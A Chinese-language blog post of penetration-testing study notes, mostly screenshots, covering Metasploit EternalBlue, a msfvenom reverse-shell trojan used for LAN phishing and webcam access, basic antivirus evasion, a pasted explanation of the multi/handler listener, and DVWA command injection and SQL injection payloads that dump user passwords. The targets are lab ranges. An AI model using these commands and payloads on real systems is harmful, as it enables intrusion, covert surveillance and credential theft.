---
title: 网络安全学习笔记--测试博客
published: 2025-08-01
description: '记录 Metasploit、SQL注入、命令执行等网络安全学习内容'
image: ../../assets/images/blog1.png
tags: [网络安全, 渗透测试, Kali]
category: '杂项学习'
draft: false 
lang: ''
---


# **1.** ***\*metasploit笔记\****

## **1.1.** ***\*启动\****

![img](一部分常见漏洞.assets/wps1.jpg) 

## **1.2.** ***\*metasploit攻击windows操作\****

![img](一部分常见漏洞.assets/wps2.jpg) 

### 1.2.1. **永恒之蓝**

![img](一部分常见漏洞.assets/wps3.jpg)![img](一部分常见漏洞.assets/wps4.jpg)![img](一部分常见漏洞.assets/wps5.jpg)![img](一部分常见漏洞.assets/wps6.jpg)![img](一部分常见漏洞.assets/wps7.jpg)![img](一部分常见漏洞.assets/wps8.jpg) 

ip地址为192.168.93.133

![img](一部分常见漏洞.assets/wps9.jpg)![img](一部分常见漏洞.assets/wps10.jpg) 

修改一些基本options后就可以run了（攻打一个windows靶场发现根本没有这个漏洞，尝试了防火墙关闭也尝试了都用net网）

## **1.3.** ***\*注释\****

![img](一部分常见漏洞.assets/wps11.jpg) 

退出：exit

# **2.** ***\*使用kali渗透工具（msfvenom）生成远程木马\****

![img](一部分常见漏洞.assets/wps12.jpg)payload:攻击载荷   format：格式

![img](一部分常见漏洞.assets/wps13.jpg)![img](一部分常见漏洞.assets/wps14.jpg) 

## **2.1.** ***\*钓鱼（不免杀）（局限于局域网）\****

![img](一部分常见漏洞.assets/wps15.jpg) 

![img](一部分常见漏洞.assets/wps16.jpg) 

![img](一部分常见漏洞.assets/wps17.jpg)![img](一部分常见漏洞.assets/wps18.jpg) 

![img](一部分常见漏洞.assets/wps19.jpg) 

 

run之后在被钓鱼机上启动demo9999.exe

![img](一部分常见漏洞.assets/wps20.jpg) 

![img](一部分常见漏洞.assets/wps21.jpg) 

比如查看目标有无摄像头![img](一部分常见漏洞.assets/wps22.jpg)

打开对面摄像头

![img](一部分常见漏洞.assets/wps23.jpg) 

![img](一部分常见漏洞.assets/wps24.jpg) 

总结

![img](一部分常见漏洞.assets/wps25.jpg) 

## **2.2.** ***\*基础免杀\****

捆绑木马·  （备注：现在无法避开火绒）

![img](一部分常见漏洞.assets/wps26.jpg) 

或者加壳（方式很多）

 

## **2.3.** ***\*ai解释\*******\*exploit/multi/handler\****

`exploit/multi/handler` 是 **Metasploit 框架中一个核心且常用的模块**，它的主要作用是充当一个**通用的网络监听器（Payload Handler）**，专门用于**接收来自目标系统的反向连接（Reverse Connection）**。

 

以下是它的详细功能和工作原理：

 

\---

 

\### **核心功能：**

1. **接收反弹连接（Reverse Shell/Connection）**：

  \- 当你在目标系统上成功执行了一个**反向Payload**（如 `reverse_tcp`, `reverse_http`, `meterpreter/reverse_tcp` 等）后，目标系统会主动尝试连接到你控制的机器。

  \- `multi/handler` 就是用来监听这个连接的“接收器”。

 

2. **会话管理（Session Management）**：

  \- 一旦目标系统连接回来，`handler` 会自动创建一个交互式会话（Session）。

  \- 你可以通过这个会话直接控制目标系统（如执行命令、上传文件、权限提升等）。

 

\---

 

\### **为什么需要它？**

\- **场景举例**：

1. 你使用 `msfvenom` 生成一个木马（Payload）：

   \```bash

   msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的IP LPORT=4444 -f exe > payload.exe

   \```

2. 将 `payload.exe` 在目标机器上执行。
3. **此时目标会主动连接你的IP:4444**。
4. 你需要提前在Metasploit中启动 `multi/handler` **监听4444端口**，才能接收到这个连接。

 

\---

 

\### **你看到的提示解析：**

\```bash

msf6 > use exploit/multi/handler 

[*] Using configured payload generic/shell_reverse_tcp

\```

\- 你选择了 `multi/handler` 模块。

\- Metasploit **自动使用了默认配置的Payload**：`generic/shell_reverse_tcp`（一个通用的反向Shell）。

 

\---

 

\### **如何正确使用？**

1. **设置Payload参数**（必须与攻击载荷匹配）：

  \```bash

  msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

  msf6 exploit(multi/handler) > set LHOST 192.168.1.100  # 监听本机IP

  msf6 exploit(multi/handler) > set LPORT 4444      # 监听端口

  \```

 

2. **启动监听**：

  \```bash

  msf6 exploit(multi/handler) > run

  \# 或

  msf6 exploit(multi/handler) > exploit

  \```

 

3. **当目标执行Payload后**：

  \- 你会看到类似提示：

   \```bash

   [*] Sending stage (175686 bytes) to 192.168.1.200

   [*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.200:49158)

   \```

  \- 输入 `sessions -i 1` 即可进入会话控制目标。

 

\---

 

\### **常见用途：**

\- 接收 `msfvenom` 生成的Payload（如EXE、APK、PHP等）。

\- 接收其他工具触发的反弹Shell（如通过漏洞利用、钓鱼攻击等）。

\- 维持稳定会话（如Meterpreter的加密通信、心跳检测）。

 

\---

 

\### **注意事项：**

1. **Payload必须匹配**：

  \- `handler` 的 `payload`, `LHOST`, `LPORT` 必须与目标执行的Payload完全一致。

2. **防火墙设置**：

  \- 确保本机的防火墙允许 `LPORT` 的入站连接（如4444端口）。

3. **网络可达**：

  \- `LHOST` 必须是目标能访问到的IP（公网IP或同一内网IP）。

 

\---

 

\### **总结：**

\> `multi/handler` **不是攻击模块**，而是Metasploit的“**接收器**”。它的唯一任务就是监听指定端口，等待目标主动连接回来。就像特工行动中的“接应人员”——攻击模块（如漏洞利用）负责潜入目标，而 `handler` 负责在安全屋等待目标主动上门接头。

 

如果你正在测试反弹Shell或渗透后维持访问，这个模块是必不可少的工具！

# **3.** ***\*OWASP TOP 10\****

每三年公布一次常见漏洞

比如常见网站漏洞

![img](一部分常见漏洞.assets/wps27.jpg) 

![img](一部分常见漏洞.assets/wps28.jpg) 

# **4.** ***\*DVWA靶场搭建\****

![img](一部分常见漏洞.assets/wps29.jpg) 

![img](一部分常见漏洞.assets/wps30.jpg)![img](一部分常见漏洞.assets/wps31.jpg) 

![img](一部分常见漏洞.assets/wps32.jpg) 

# **5.** ***\*命令执行漏洞\****

## **5.1.** ***\*过程\****

![img](一部分常见漏洞.assets/wps33.jpg) 

![img](一部分常见漏洞.assets/wps34.jpg) 

 

 

 

命令连接符

![img](一部分常见漏洞.assets/wps35.jpg) 

![img](一部分常见漏洞.assets/wps36.jpg) 

## **5.2.** ***\*常用\****

![img](一部分常见漏洞.assets/wps37.jpg) 

## **5.3.** ***\*记录（low）\****

![img](一部分常见漏洞.assets/wps38.jpg)![img](一部分常见漏洞.assets/wps39.jpg) 

 

127.0.0.1&whoami

![img](一部分常见漏洞.assets/wps40.jpg) 

![img](一部分常见漏洞.assets/wps41.jpg) 

## **5.4.** ***\*防御\****

![img](一部分常见漏洞.assets/wps42.jpg)![img](一部分常见漏洞.assets/wps43.jpg) 

 

### 5.4.1. **medium**

![img](一部分常见漏洞.assets/wps44.jpg) 

![img](一部分常见漏洞.assets/wps45.jpg) 

![img](一部分常见漏洞.assets/wps46.jpg) 

![img](一部分常见漏洞.assets/wps47.jpg) 

### 5.4.2. **high**

![img](一部分常见漏洞.assets/wps48.jpg) 

### 5.4.3. **impossible**

![img](一部分常见漏洞.assets/wps49.jpg) 

![img](一部分常见漏洞.assets/wps50.jpg) 

# **6.** ***\*SQL注入漏洞\****

![img](一部分常见漏洞.assets/wps51.jpg) 

![img](一部分常见漏洞.assets/wps52.jpg) 

![img](一部分常见漏洞.assets/wps53.jpg) 

![img](一部分常见漏洞.assets/wps54.jpg) 

 

 

## **6.1.** ***\*解析\****

![img](一部分常见漏洞.assets/wps55.jpg) 

![img](一部分常见漏洞.assets/wps56.jpg)![img](一部分常见漏洞.assets/wps57.jpg) 

## **6.2.** ***\*判断\****

### 6.2.1. **low**

![img](一部分常见漏洞.assets/wps58.jpg)![img](一部分常见漏洞.assets/wps59.jpg)![img](一部分常见漏洞.assets/wps60.jpg) 

## **6.3.** ***\*利用\****

### 6.3.1. **low**

![img](一部分常见漏洞.assets/wps61.jpg)![img](一部分常见漏洞.assets/wps62.jpg)![img](一部分常见漏洞.assets/wps63.jpg)![img](一部分常见漏洞.assets/wps64.jpg) 

1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#（此时在我的dvwa中出现了Illegal mix of collations for operation 'UNION'，ai解释是![img](一部分常见漏洞.assets/wps65.jpg)![img](一部分常见漏洞.assets/wps66.jpg)![img](一部分常见漏洞.assets/wps67.jpg)

而我使用了转化为二进制（使用`BINARY`关键字）来避免排序规则冲突。）

 

![img](一部分常见漏洞.assets/wps68.jpg) 

 

![img](一部分常见漏洞.assets/wps69.jpg) 

1’ union select user,password from users#

![img](一部分常见漏洞.assets/wps70.jpg) 

## **6.4.** ***\*SQLmap工具\****

kali自带，自己电脑上需要先安装python环境再安装sqlmap，再sqlmap文件夹中打开终端并python sqlmap.py

![img](一部分常见漏洞.assets/wps71.jpg) 

![img](一部分常见漏洞.assets/wps72.jpg) 

(cookie能告诉sqlmap”我已经登录了，你不要再登录了，直接帮我跑这个sql注入就行了“)

cookie获取：（火狐）F12进入开发者模式，然后在网络中重新载入（找不到可以ctrl+r刷新）

![img](一部分常见漏洞.assets/wps73.jpg)![img](一部分常见漏洞.assets/wps74.jpg)![img](一部分常见漏洞.assets/wps75.jpg)![img](一部分常见漏洞.assets/wps76.jpg) 

自动检测到有sql注入漏洞

![img](一部分常见漏洞.assets/wps77.jpg) 

![img](一部分常见漏洞.assets/wps78.jpg) 

![img](一部分常见漏洞.assets/wps79.jpg)![img](一部分常见漏洞.assets/wps80.jpg)![img](一部分常见漏洞.assets/wps81.jpg)![img](一部分常见漏洞.assets/wps82.jpg)![img](一部分常见漏洞.assets/wps83.jpg) 

![img](一部分常见漏洞.assets/wps84.jpg) 

![img](一部分常见漏洞.assets/wps85.jpg)（第二个选项选的n，没有爆破，只是显示）

## **6.5.** ***\*防御\****

![img](一部分常见漏洞.assets/wps86.jpg) 

### 6.5.1. **medium**

![img](一部分常见漏洞.assets/wps87.jpg) 

![img](一部分常见漏洞.assets/wps88.jpg) 

![img](一部分常见漏洞.assets/wps89.jpg) 

### 6.5.2. **high**

![img](一部分常见漏洞.assets/wps90.jpg) 

### 6.5.3. **impossible**

![img](一部分常见漏洞.assets/wps91.jpg)![img](一部分常见漏洞.assets/wps92.jpg)![img](一部分常见漏洞.assets/wps93.jpg) 

# **7.** ***\*收集目标信息\****

## **7.1.** ***\*端口扫描\****

![image-20250803101022183](一部分常见漏洞.assets/image-20250803101022183.png) 

windows查询自身外联的一个网络状况（端口范围0~65535）

端口扫描是为了发现目标主机开放的端口以及其对应的服务

### 7.1.1. **zenmap**
